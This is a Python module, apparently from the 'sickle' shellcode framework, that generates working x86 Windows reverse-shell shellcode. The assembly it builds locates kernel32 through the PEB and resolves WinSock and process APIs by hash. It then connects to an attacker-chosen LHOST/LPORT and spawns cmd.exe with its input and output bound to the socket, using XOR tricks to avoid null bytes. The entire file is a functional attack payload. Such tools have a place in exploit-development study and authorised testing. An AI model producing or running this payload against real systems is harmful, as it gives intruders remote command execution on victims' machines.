import sys
import ctypes
import struct

import sickle.common.lib.generic.convert as convert
import sickle.common.lib.generic.modparser as modparser
import sickle.common.lib.programmer.builder as builder

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
    ntdef,
    ws2def,
    winternl,
    winsock2,
    processthreadsapi,
)

class Shellcode():

    arch = "x86"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = []

    summary = ("Reverse shell via TCP over IPv4 that provides an interactive cmd.exe "
               "session")

    description = ("A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe"    
                   " session. Since this payload is not staged, there is no need for anything"
                   " more than a Netcat listener.")

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "CreateProcessA",
                "TerminateProcess",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ]
        }

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({ 
            "wsaData"                       : 0x00,
            "name"                          : ctypes.sizeof(ws2def.sockaddr),
            "lpStartupInfo"                 : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
            "lpCommandLine"                 : len("cmd\x00"),
            "lpProcessInformation"          : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        stub = f"""
getKernel32:
    mov dl, 0x4b
getPEB:
    xor ebx, ebx
    xor ecx, ecx
    mov bl, 0x30
    mov edi, fs:[ebx]
    mov edi, [edi + {winternl._PEB.Ldr.offset}]
    mov edi, [edi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    mov eax, [edi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    mov esi, [edi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]    
    mov edi, [edi]
    cmp [esi + 0x18], cx
    jne search
    cmp [esi], dl
    jne search
found:
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = f"""
lookupFunction:
    push ebp
    mov ebp, esp
    sub esp, 0x08
    xor ebx, ebx
    mov [ebp - 0x04], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
    mov [ebp - 0x08], edx       ; Argv passed into lookupFunction
    mov ebx, [edi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    add ebx, {winnt._IMAGE_NT_HEADERS.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
    add ebx, edi
    mov eax, [ebx]
    mov ebx, edi
    add ebx, eax
    mov eax, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov edx, edi
    add edx, eax
    mov ecx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
    mov [ebp - 0x04], ebx       ; Backup EBX since we are going to XOR it
parseNames:
    jecxz error
    dec ecx
    mov eax, [edx + ecx * 4]
    mov esi, edi
    add esi, eax
    xor eax, eax
    xor ebx, ebx
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror ebx, 0xD
    add ebx, eax
    jmp calcHash
calcDone:
    cmp ebx, [ebp - 0x08]
    jnz parseNames
findAddress:
    mov ebx, [ebp - 0x04]       ; Restore EBX value prevously saved
    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add edx, edi
    xor eax, eax
    mov ax, [edx + ecx * 2]
    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add edx, edi
    mov eax, [edx + eax * 4]
    add eax, edi
error:
    leave
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = convert.from_str_to_xwords(lib, 0x04)
        write_index = self.storage_offsets["functionName"]

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
            src += "    mov [ebp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [ebp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [ebp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor ecx, ecx
    mov [ebp - {write_index}], cl
    lea ecx, [ebp - {self.storage_offsets['functionName']}]
    push ecx
    mov eax, [ebp - {self.storage_offsets['LoadLibraryA']}]
    call eax
        """

        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = ""
        for lib, imports in self.dependencies.items():
            if (lib != "Kernel32.dll"):
                stub += self.load_library(lib)
                stub += """
    mov edi, eax
                """

            for func in range(len(imports)):
                stub += f"""
get_{imports[func]}:
    mov edx, {convert.from_str_to_win_hash(imports[func])}
    call lookupFunction
    mov [ebp - {self.storage_offsets[imports[func]]}], eax
                """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])


        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
        sin_port = struct.pack('<H', lport).hex()
        sin_family = struct.pack('>H', ws2def.AF_INET).hex()

        shellcode = f"""
_start:
    push ebp
    mov ebp, esp

    ; Allocate the stack space with the use of AL of EAX in order to avoid a NULL byte
    xor eax, eax
    mov al, {self.stack_space}
    sub esp, eax
"""

        shellcode += self.get_kernel32()

        shellcode += """
    jmp resolveFunctions
"""

        shellcode += self.lookup_function()

        shellcode += """
resolveFunctions:
    mov edi, eax
"""

        shellcode += self.resolve_functions()

        shellcode += f"""
; EAX => WSAStartup([in]  WORD      wVersionRequired,
;                   [out] LPWSADATA lpWSAData);
call_WSAStartup:
    mov eax, [ebp - {self.storage_offsets['WSAStartup']}]

    lea ecx, [ebp - {self.storage_offsets['wsaData']}]
    push ecx

    xor ecx, ecx
    mov cx, 0x202
    push ecx

    call eax

; EAX => WSASocketA([in] int                 af,
;                   [in] int                 type,
;                   [in] int                 protocol,
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
;                   [in] GROUP               g,
;                   [in] DWORD               dwFlags);
call_WSASocketA:
    mov eax, [ebp - {self.storage_offsets['WSASocketA']}]
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    mov cl, {ws2def.IPPROTO_TCP}
    push ecx
    mov cl, {winsock2.SOCK_STREAM}
    push ecx
    mov cl, {ws2def.AF_INET}
    push ecx
    call eax

    mov esi, eax ; Save the socket file descriptor (sockfd)
"""

        # Generate a value that will be XOR'd by 0xFFFFFFFF in order to get the
        # original value for:
        #
        #   sin_port | sin_family
        #   STARTF_USESTDHANDLES
        #   "cmd"
        #
        # These values will then have to be XOR'd by 0xFFFFFFFF
        xor_sockaddr = hex(int(f"{sin_port}{sin_family}", 16) ^ 0xFFFFFFFF)
        xor_std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16) ^ 0xFFFFFFFF)
        xor_cmd = hex(0x646d63 ^ 0xFFFFFFFF)

        shellcode += f"""
; EAX => connect([in] SOCKET s,
;                [in] const sockaddr *name,
;                [in] int namelen);
call_connect:
    xor ecx, ecx
    mov cl, {ctypes.sizeof(ws2def.sockaddr)}
    push ecx
    mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {sin_addr}

    mov eax, 0xffffffff
    xor eax, {xor_sockaddr}

    mov dword ptr [ebp - {self.storage_offsets['name']}], eax
    lea ecx, [ebp - {self.storage_offsets['name']}]
    push ecx
    push esi
    mov eax, [ebp - {self.storage_offsets['connect']}]
    call eax

; [EBX] => typedef struct _STARTUPINFOA {{ }}
setup_STARTUPINFOA:
    lea ebx, [ebp - {self.storage_offsets['lpStartupInfo']}]

memsetStructBuffer:
    lea edi, [ebp - {self.storage_offsets['lpStartupInfo']}]
    xor eax, eax
    xor ecx, ecx
    mov cl, {int( ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04 )}
    rep stosd

initMembers:
    mov al, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
    mov [ebx], eax
    mov eax, 0xffffffff
    xor eax, {xor_std_handles}
    mov [ebx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], esi
    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], esi
    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], esi

; EAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,
;                       [in, out, optional] LPSTR                 lpCommandLine,
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
;                       [in]                BOOL                  bInheritHandles,
;                       [in]                DWORD                 dwCreationFlags,
;                       [in, optional]      LPVOID                lpEnvironment,
;                       [in, optional]      LPCSTR                lpCurrentDirectory,
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
call_CreateProccessA:
    lea ecx, [ebp - {self.storage_offsets['lpProcessInformation']}]
    push ecx
    push ebx
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    inc ecx
    push ecx
    dec ecx
    push ecx
    push ecx
    lea ecx, [ebp - {self.storage_offsets['lpCommandLine']}]
    mov eax, 0xffffffff
    xor eax, {xor_cmd}
    mov dword ptr [ecx], eax
    push ecx
    xor ecx, ecx
    push ecx
    mov eax, [ebp - {self.storage_offsets['CreateProcessA']}]
    call eax

; EAX => TerminateProcess([in] HANDLE hProcess,
;                         [in] UINT   uExitCode);
call_TerminateProcess:
    xor ecx, ecx
    push ecx
    dec ecx
    push ecx    
    mov eax, [ebp - {self.storage_offsets['TerminateProcess']}]
    call eax
"""

        return shellcode

    def get_shellcode(self):
        """Generates Shellcode
        """

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
